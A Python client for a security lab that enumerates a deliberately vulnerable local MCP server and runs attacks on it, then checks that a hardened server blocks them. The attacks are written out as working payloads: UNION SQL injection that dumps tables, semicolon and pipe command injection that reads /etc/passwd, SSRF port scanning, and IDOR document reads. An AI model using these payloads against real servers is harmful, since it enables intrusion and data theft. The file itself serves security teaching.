"""
MCP Security Lab client — enumerate and exploit the vulnerable server,
then verify mitigations on the secure server.

Usage:
  python src/client.py --url http://127.0.0.1:8000/mcp/ --attack all
  python src/client.py --url http://127.0.0.1:8003/mcp/ --attack secure
  python src/client.py --url http://127.0.0.1:8000/mcp/ --attack sqli

Attacks: enumerate | info | idor | sqli | cmdi | ssrf | all | secure
"""

import argparse
import asyncio

from fastmcp import Client


# ── Helpers ────────────────────────────────────────────────────────────────────

async def read(url: str, uri: str) -> str:
    async with Client(url) as c:
        try:
            result = await c.read_resource(uri)
            return result[0].text
        except Exception as e:
            return f"[-] {e}"


async def tool(url: str, name: str, args: dict) -> str:
    async with Client(url) as c:
        try:
            result = await c.call_tool(name, args)
            return result.content[0].text
        except Exception as e:
            return f"[-] {e}"


def section(title: str):
    print(f"\n{'='*60}")
    print(f"  {title}")
    print("="*60)


def step(n: int, desc: str):
    print(f"\n[{n}] {desc}")


# ── Enumeration ────────────────────────────────────────────────────────────────

async def enumerate_server(url: str):
    section("ENUMERATE: Resources and Tools")
    async with Client(url) as c:
        resources = await c.list_resources()
        templates = await c.list_resource_templates()
        tools = await c.list_tools()

    print("\nResources:")
    for r in resources:
        print(f"  {r.uri}")
        if r.description:
            print(f"    {r.description.strip()}")

    print("\nResource Templates:")
    for t in templates:
        print(f"  {t.uriTemplate}")
        if t.description:
            print(f"    {t.description.strip()}")

    print("\nTools:")
    for t in tools:
        params = list((t.inputSchema.get("properties") or {}).keys())
        print(f"  {t.name}({', '.join(params)})")
        if t.description:
            print(f"    {t.description.strip()}")


# ── Attack 1: Sensitive Information Disclosure ─────────────────────────────────

async def demo_info_disclosure(url: str):
    section("ATTACK 1: Sensitive Information Disclosure")

    step(1, "Reading server logs via resource://logs")
    print(await read(url, "resource://logs"))

    step(2, "Triggering verbose error to leak API key (nonexistent item)")
    print(await read(url, "quantity://nonexistent_item"))


# ── Attack 2: Broken Authorization / IDOR ─────────────────────────────────────

async def demo_idor(url: str):
    section("ATTACK 2: Broken Authorization (IDOR)")
    for doc_id in ["1", "2", "3"]:
        step(int(doc_id), f"Accessing document {doc_id} without authentication")
        print(await read(url, f"document://{doc_id}"))


# ── Attack 3: SQL Injection ────────────────────────────────────────────────────

async def demo_sqli(url: str):
    section("ATTACK 3: SQL Injection")

    step(1, "Confirming injection — single quote causes error")
    print(await read(url, "price://banana'"))

    step(2, "Confirming injection — SQL comment makes query valid again")
    print(await read(url, "price://banana'--"))

    step(3, "UNION injection — extract SQLite version (URL-encoded spaces)")
    print(await read(url, "price://x'%20UNION%20SELECT%20sqlite_version()--"))

    step(4, "UNION injection — dump table names")
    print(await read(
        url,
        "price://x'%20UNION%20SELECT%20group_concat(name)%20FROM%20sqlite_master%20WHERE%20type='table'--"
    ))

    step(5, "UNION injection — dump document owners from documents table")
    print(await read(
        url,
        "price://x'%20UNION%20SELECT%20group_concat(owner)%20FROM%20documents--"
    ))


# ── Attack 4: Command Injection ────────────────────────────────────────────────

async def demo_cmdi(url: str):
    section("ATTACK 4: Command Injection")

    step(1, "Calling a whitelisted command (date)")
    print(await tool(url, "execute_server_command", {"command": "date"}))

    step(2, "Calling a blocked command (id) — expect 'Invalid Command'")
    print(await tool(url, "execute_server_command", {"command": "id"}))

    step(3, "Bypassing whitelist with semicolon injection (date;id)")
    print(await tool(url, "execute_server_command", {"command": "date;id"}))

    step(4, "Pipe injection to read /etc/passwd excerpt")
    print(await tool(url, "execute_server_command", {"command": "whoami|head -3 /etc/passwd"}))


# ── Attack 5: SSRF ─────────────────────────────────────────────────────────────

async def demo_ssrf(url: str):
    section("ATTACK 5: Server-Side Request Forgery (SSRF)")

    step(1, "Probing open internal port 8001 (quantity API)")
    print(await tool(url, "fetch_price_data", {"url": "http://127.0.0.1:8001/"}))

    step(2, "Probing likely closed port 9999")
    print(await tool(url, "fetch_price_data", {"url": "http://127.0.0.1:9999"}))

    step(3, "Fetching quantity API data via SSRF (bypasses API key requirement)")
    print(await tool(url, "fetch_price_data", {"url": "http://127.0.0.1:8001/api/item/banana"}))

    step(4, "Port scan: checking port 22 (SSH)")
    print(await tool(url, "fetch_price_data", {"url": "http://127.0.0.1:22"}))


# ── Secure server verification ─────────────────────────────────────────────────

async def demo_secure(url: str):
    section("MITIGATIONS: Secure Server — Attacks Blocked")

    step(1, "SQL injection attempt → blocked by parameterized query")
    print(await read(url, "price://banana'--"))

    step(2, "SQL injection with invalid chars → blocked by input validation")
    print(await read(url, "price://banana'"))

    step(3, "Command injection (date;id) → blocked by exact-match allowlist")
    print(await tool(url, "execute_server_command", {"command": "date;id"}))

    step(4, "Allowed command (date) still works")
    print(await tool(url, "execute_server_command", {"command": "date"}))

    step(5, "SSRF to internal host → blocked by hostname allowlist")
    print(await tool(url, "fetch_price_data", {"url": "http://127.0.0.1:8001/"}))

    step(6, "IDOR: doc 1 (alice's) — accessible as authenticated user alice")
    print(await read(url, "document://1"))

    step(7, "IDOR: doc 2 (bob's) — blocked by ownership check")
    print(await read(url, "document://2"))


# ── Main ───────────────────────────────────────────────────────────────────────

async def main():
    parser = argparse.ArgumentParser(description="MCP Security Lab client")
    parser.add_argument(
        "--url",
        default="http://127.0.0.1:8000/mcp/",
        help="MCP server URL",
    )
    parser.add_argument(
        "--attack",
        choices=["enumerate", "info", "idor", "sqli", "cmdi", "ssrf", "all", "secure"],
        default="all",
        help="Attack module to run (default: all)",
    )
    args = parser.parse_args()

    url = args.url
    attack = args.attack

    if attack in ("enumerate", "all"):
        await enumerate_server(url)
    if attack in ("info", "all"):
        await demo_info_disclosure(url)
    if attack in ("idor", "all"):
        await demo_idor(url)
    if attack in ("sqli", "all"):
        await demo_sqli(url)
    if attack in ("cmdi", "all"):
        await demo_cmdi(url)
    if attack in ("ssrf", "all"):
        await demo_ssrf(url)
    if attack == "secure":
        await demo_secure(url)


asyncio.run(main())
